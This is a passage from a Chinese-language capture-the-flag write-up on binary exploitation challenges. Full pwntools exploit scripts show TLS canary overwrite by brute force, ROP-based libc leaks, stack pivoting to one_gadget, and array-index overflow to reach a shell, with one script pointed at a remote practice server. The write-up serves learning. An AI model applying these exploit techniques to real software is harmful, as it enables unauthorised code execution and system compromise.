        p.send(payload)
        p.recvuntil('\x01')
        canary = '\x00' + p.recv()[:7]
        print hex(u64(canary))
        payload = ''
        payload += 'a'*0x28 + canary + 'aaaaaaaa' + system_addr
        p.send(payload)
        try:
            p.recv(timeout = 1)
        except EOFError:
            p.close()
            continue
        p.interactive()
爆破是常规操作，不爆破也是行的，如图：
因为在read后其实前面的字节是一样的，所以只需要覆盖最后一个字节为\x3E即可：
最后检验下：
总结：这里就是利用了read函数后面有printf或者puts函数可以打印，通过覆盖低位\x0a，达到泄露低地址的目的，学习到了新技能。
### 题目6:bin5
bs
#### 开始分析：
分析逻辑可知，是创建了进程，关键逻辑在start_routine函数那里，这里知道是s的大小是0x1010，而我们的输入可以达到0x10000，很明显想到栈溢出，但是有canary保护，而且是线程，所以我们这里学习一种新招式，TSL（线程局部存储）攻击，基本思路就是我们得覆盖很多个a到高地址，直到把TLS给覆盖从而修改了canary的值为a，绕过了canary后就可以栈溢出操作了。
TLS中存储的canary在fs：0x28处，我们能覆盖到这里就好啦~当然我们不知道具体在哪里，所以只能爆破下：
这是爆破canary位置的脚本：
    while True:
        p = process('./bs')
        p.recvuntil("How many bytes do you want to send?")
        p.sendline(str(offset))
        payload = ''
        payload += 'a'*0x1010
        payload += p64(0xdeadbeef)
        payload += p64(main_addr)
        payload += 'a'*(offset-len(payload))
        p.send(payload)
        temp = p.recvall()
        if "Welcome" in temp:
            p.close()
            break
        else:
            offset += 1
            p.close()
它会卡在offset为6128那里：
说明我们成功覆盖了canary，偏移量为6128。接下来就好办啦~利用栈迁移的操作+one_gadget直接getshell~
#### 大体思路：
1、通过padding爆破填充a修改TLS中的canary为aaaaaaaa，从而绕过栈溢出保护（这里必须是线程的题目，而且输入足够大才行！）
2、泄露出puts的got地址得到真实的基地址，用于getshell
3、利用栈迁移(需要有read函数和leave；ret的ROP可以用)，在bss段中开辟一个空间来写one_gadget来payload~
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='amd64', os='linux')
    p = process('./bs')
    elf = ELF('./bs')
    libc = elf.libc
    main_addr = 0x4009E7
    offset = 6128
    bss_start = elf.bss()
    fakebuf = bss_start + 0x300
    pop_rdi_ret = 0x400c03
    pop_rsi_r15_ret = 0x400c01
    leave_ret = 0x400955
    puts_got = elf.got["puts"]
    puts_plt = elf.symbols["puts"]
    puts_libc = libc.symbols["puts"]
    read_plt = elf.symbols["read"]
    p.recvuntil("How many bytes do you want to send?")
    p.sendline(str(offset))
    payload = ''
    payload += 'a'*0x1010 
    payload += p64(fakebuf)
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(pop_rdi_ret)
    payload += p64(0)
    payload += p64(pop_rsi_r15_ret)
    payload += p64(fakebuf)
    payload += p64(0x0)
    payload += p64(read_plt)
    payload += p64(leave_ret)
    payload += 'a'*(offset - len(payload))
    p.send(payload)
    p.recvuntil("It's time to say goodbye.\n")
    puts_addr = u64(p.recv()[:6].ljust(8,'\x00'))
    print hex(puts_addr)
    getshell_libc = 0xf02a4
    base_addr = puts_addr - puts_libc
    one_gadget = base_addr + getshell_libc
    payload = ''
    payload += p64(0xdeadbeef)
    payload += p64(one_gadget)
    p.send(payload)
    p.interactive()
这是我们的payload在栈中的分布图，可以知道puts的真实地址是6位的，所以才要补齐两个\0，最后验证下：
其实这里不用栈迁移也一样做的（栈迁移是大佬写的，下面是自己复现时做出来的）：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='amd64', os='linux')
    p = process('./bs')
    elf = ELF('./bs')
    libc = elf.libc
    main_addr = 0x4009E7
    fgets_addr = 0x400957
    offset = 6128
    bss_start = elf.bss()
    fakebuf = bss_start + 0x300
    pop_rdi_ret = 0x400c03
    pop_rsi_r15_ret = 0x400c01
    leave_ret = 0x400955
    puts_got = elf.got["puts"]
    puts_plt = elf.symbols["puts"]
    puts_libc = libc.symbols["puts"]
    read_plt = elf.symbols["read"]
    p.recvuntil("How many bytes do you want to send?")
    p.sendline(str(offset))
    payload = ''
    payload += 'a'*0x1010 
    payload += p64(0xdeadbeef)
    payload += p64(pop_rdi_ret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(fgets_addr)
    payload += 'a'*(offset - len(payload))
    p.send(payload)
    p.recvuntil("It's time to say goodbye.\n")
    puts_addr = u64(p.recv()[:6].ljust(8,'\x00'))
    print hex(puts_addr)
    getshell_libc = 0xf02a4
    base_addr = puts_addr - puts_libc
    one_gadget = base_addr + getshell_libc
    payload = ''
    payload += 'a'*0x1010
    payload += p64(0xdeadbeef)
    payload += p64(one_gadget)
    p.sendline(payload)
    p.interactive()
检验下：
##### 总结：
针对于这种多线程的题目，修改TLS的canary，绕过canary，又增长了新姿势，这里提一下栈迁移，在有read函数的情况下，可以利用栈迁移的思想，到bss段是常有的事，一般是bss+0x300的位置开始写。如果read后面有puts函数或者printf函数，就可以泄露出ebp的值，从而确定栈顶指针，从而写到栈中，然后ebp写esp的地址，leave就会跳到esp去执行我们写入的东西。
### 题目7 bin6
homework
一波检查和分析
开了栈溢出保护和堆栈不可执行，看main，这里name是到bss段的，最后saybye的时候打印出来，重点看中间的程序，发现有数组，这里一开始不明感没做过这种题目，一直在想怎么泄露canary然后栈溢出去覆盖，最后ret到system，但是一直木有，师傅提示这是个新姿势，数组！数组下标溢出~学习一波先呗：
C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的  
数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行  
的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代  
码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以  
为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越  
界了，那么它会自动接着那块内存往后写。
漏洞利用：继续往后写内存，这里就可以通过计算，写到我们的ret位置处，这样就可以直接getshell啦~
再回来这题的栈，
这里中间间隔了60，也就是15条4字节的指令，下标从0开始，那么ret的下标就是14，这样就轻松地绕过了cananry，同时这题里面有现成的system函数（0x080485FB），那么payload：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='i386', os='linux')
    local = 1
    elf = ELF('./homework')
    if local:
        p = process('./homework')
        libc = elf.libc
    else:
        p = remote('hackme.inndy.tw',7701)
        libc = ELF('./libc.so.6')
    def z(a=''):
        gdb.attach(p,a)
        if a == '':
            raw_input()
    p.recvuntil("What's your name? ")
    p.sendline("Your father")
    p.recvuntil("4 > dump all numbers")
    p.recvuntil(" > ")
    p.sendline("1")
    p.recvuntil("Index to edit: ")
    p.sendline("14")
    p.recvuntil("How many? ")
    system_addr = 0x080485FB
    p.sendline(str(system_addr))
    p.sendline('0')
    p.interactive()
#### 总结：
这里利用数组下标溢出轻松绕过canary直接到ret去getshell~完美。
后续会继续更新喔~